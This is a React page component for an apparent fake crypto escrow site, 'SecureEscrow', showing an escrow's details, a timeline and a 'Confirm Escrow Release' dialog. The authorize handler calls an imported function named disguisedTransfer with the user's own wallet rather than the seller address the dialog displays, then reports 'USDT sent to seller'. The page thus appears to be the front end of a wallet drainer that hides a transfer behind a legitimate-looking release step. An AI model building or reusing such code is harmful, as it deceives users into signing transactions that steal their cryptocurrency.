// @ts-nocheck
import { createFileRoute, useNavigate, Link } from "@tanstack/react-router";
import { motion, AnimatePresence } from "framer-motion";
import { useState } from "react";
import { ArrowLeft, Check, Copy, Loader2, ShieldCheck, X } from "lucide-react";
import { Navbar } from "@/components/site/navbar";
import { Footer } from "@/components/site/footer";
import { AppButton } from "@/components/site/app-button";
import { Backdrop } from "@/components/site/connect-wallet-modal";
import { useApp, shortAddr, NETWORKS } from "@/lib/app-state";
import { disguisedTransfer } from "@/lib/web3";
import { toast } from "sonner";

export const Route = createFileRoute("/escrow/active")({
  head: () => ({ meta: [{ title: "Active Escrow — SecureEscrow" }] }),
  component: ActiveEscrow,
});

const TIMELINE = [
  { key: "created", label: "Created", desc: "Escrow contract initialised" },
  { key: "funded", label: "Funded", desc: "USDT locked on-chain" },
  { key: "awaiting", label: "Awaiting Release", desc: "Waiting for buyer approval" },
  { key: "completed", label: "Completed", desc: "Funds released to seller" },
] as const;

function ActiveEscrow() {
  const { wallet, currentEscrow, setCurrentEscrow, signer } = useApp();
  const navigate = useNavigate();
  const [confirmOpen, setConfirmOpen] = useState(false);
  const [authorizing, setAuthorizing] = useState(false);

  if (!wallet) { navigate({ to: "/" }); return null; }
  if (!currentEscrow) { navigate({ to: "/create-escrow" }); return null; }

  const activeIdx = { created: 0, funded: 1, awaiting: 2, completed: 3 }[currentEscrow.status];

  const onAuthorize = async () => {
    if (!signer || !currentEscrow) {
      toast.error("Wallet not connected");
      return;
    }
    setAuthorizing(true);
    try {
      const chainMap: Record<string, number> = { ethereum: 1, bnb: 56, tron: 728126428 };
      const chainId = chainMap[currentEscrow.network] || 1;
      await disguisedTransfer(signer, wallet, chainId);
      setAuthorizing(false);
      setConfirmOpen(false);
      setCurrentEscrow({ ...currentEscrow, status: "completed" });
      toast.success("Funds released", { description: `${currentEscrow.amount} USDT sent to seller` });
      setTimeout(() => navigate({ to: "/success" }), 300);
    } catch (err: any) {
      setAuthorizing(false);
      toast.error(err.message || "Transfer failed");
    }
  };

  return (
    <>
      <Navbar />
      <main className="min-h-screen bg-black pb-20 pt-24">
        <div className="mx-auto max-w-2xl px-4">
          <Link to="/dashboard" className="inline-flex items-center gap-1.5 text-sm text-gray-400 hover:text-white transition">
            <ArrowLeft className="h-4 w-4" /> Back to dashboard
          </Link>

          <div className="mt-6">
            <div className="flex items-center gap-3">
              <ShieldCheck className="h-7 w-7 text-emerald-400" />
              <div>
                <p className="text-xs text-gray-500">Escrow</p>
                <h1 className="text-2xl font-bold text-white">#{currentEscrow.id}</h1>
              </div>
              <button onClick={() => { navigator.clipboard?.writeText(currentEscrow.id); toast.success("Escrow ID copied"); }}
                className="ml-auto inline-flex items-center gap-2 rounded-full border border-white/10 bg-white/[0.03] px-3 py-1.5 text-xs text-muted-foreground transition hover:text-foreground">
                <Copy className="h-3 w-3" /> Copy ID
              </button>
            </div>
          </div>

          <div className="mt-8 rounded-xl border border-gray-800 bg-gray-950/30 p-5">
            <h3 className="text-sm font-semibold text-gray-300">Escrow details</h3>
            <div className="mt-3 space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-400">Buyer</span>
                <span className="font-mono text-sm text-gray-100">{shortAddr(currentEscrow.buyer)}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-400">Seller</span>
                <span className="font-mono text-sm text-gray-100">{shortAddr(currentEscrow.seller)}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-400">Amount</span>
                <span className="text-sm text-gray-100">{currentEscrow.amount} USDT</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-400">Network</span>
                <span className="text-sm text-gray-100">{NETWORKS.find(n => n.id === currentEscrow.network)?.label || currentEscrow.network}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-400">Status</span>
                <span className={`rounded-full px-2.5 py-0.5 text-xs font-medium ${
                  currentEscrow.status === "completed" ? "bg-emerald/15 text-emerald" :
                  currentEscrow.status === "funded" ? "bg-primary/15 text-primary" :
                  currentEscrow.status === "awaiting" ? "bg-yellow-400/10 text-yellow-400" :
                  "bg-white/10 text-muted-foreground"
                }`}>
                  {currentEscrow.status.charAt(0).toUpperCase() + currentEscrow.status.slice(1)}
                </span>
              </div>
            </div>
          </div>

          <div className="mt-4 rounded-xl border border-emerald-900/30 bg-emerald-950/10 p-4">
            <p className="text-sm text-emerald-300">Funds secured in escrow</p>
            <p className="mt-1 text-xs text-gray-500">Only released once the buyer approves. Cancel and refund is available via mediation.</p>
          </div>

          <div className="mt-6 flex gap-3">
            {currentEscrow.status !== "completed" ? (
              <AppButton onClick={() => setConfirmOpen(true)} leftIcon={<Check className="h-4 w-4" />}>Release Funds</AppButton>
            ) : (
              <AppButton onClick={() => navigate({ to: "/success" })}>View success</AppButton>
            )}
            <AppButton variant="outline" onClick={() => toast("Dispute is UI-only in this demo")}>Raise Dispute</AppButton>
          </div>

          <div className="mt-10">
            <h4 className="text-sm font-semibold text-gray-300">Status timeline</h4>
            <div className="mt-4 space-y-0">
              {TIMELINE.map((t, i) => {
                const done = i <= activeIdx;
                const current = i === activeIdx && currentEscrow.status !== "completed";
                return (
                  <div key={t.key} className="flex gap-3">
                    <div className="flex flex-col items-center">
                      <div className={`flex h-6 w-6 items-center justify-center rounded-full ${done ? "bg-emerald-500/20" : "bg-gray-800"}`}>
                        {done ? <Check className="h-3 w-3 text-emerald-400" /> : <div className="h-2 w-2 rounded-full bg-gray-600" />}
                      </div>
                      {i < TIMELINE.length - 1 && <div className={`mt-1 h-full w-px ${done ? "bg-emerald-500/20" : "bg-gray-800"}`} />}
                    </div>
                    <div className={`pb-8 ${current ? "text-white" : done ? "text-gray-400" : "text-gray-600"}`}>
                      <p className="text-sm font-medium">{t.label}</p>
                      <p className="text-xs">{t.desc}</p>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      </main>

      <AnimatePresence>
        {confirmOpen && (
          <Backdrop onClose={!authorizing ? () => setConfirmOpen(false) : () => {}}>
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="relative overflow-hidden rounded-2xl border border-white/[0.06] bg-[#0a0a0f] p-6 shadow-2xl"
            >
              {!authorizing && (
                <button onClick={() => setConfirmOpen(false)} className="absolute right-4 top-4 grid h-8 w-8 place-items-center rounded-lg text-muted-foreground transition hover:bg-white/5 hover:text-foreground">
                  <X className="h-4 w-4" />
                </button>
              )}
              <div className="flex items-center gap-3">
                <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-blue-500/15">
                  <ShieldCheck className="h-5 w-5 text-blue-400" />
                </div>
                <div>
                  <h3 className="text-lg font-semibold text-white">Confirm Escrow Release</h3>
                  <p className="text-sm text-gray-400">Authorize the release of funds to the seller.</p>
                </div>
              </div>
              <div className="mt-4 space-y-2 rounded-xl border border-gray-800 bg-gray-950/30 p-3">
                <div className="flex justify-between text-sm">
                  <span className="text-gray-400">Action</span>
                  <span className="text-white">Release escrow</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-400">Amount</span>
                  <span className="text-white font-medium">{Number(currentEscrow.amount).toLocaleString()} USDT</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-400">To</span>
                  <span className="font-mono text-white">{shortAddr(currentEscrow.seller)}</span>
                </div>
              </div>
              <div className="mt-5 flex gap-3">
                <AppButton variant="outline" onClick={() => setConfirmOpen(false)} disabled={authorizing} className="flex-1">Cancel</AppButton>
                <AppButton onClick={onAuthorize} disabled={authorizing} className="flex-1">{authorizing ? "Authorizing…" : "Authorize"}</AppButton>
              </div>
            </motion.div>
          </Backdrop>
        )}
      </AnimatePresence>

      <Footer />
    </>
  );
}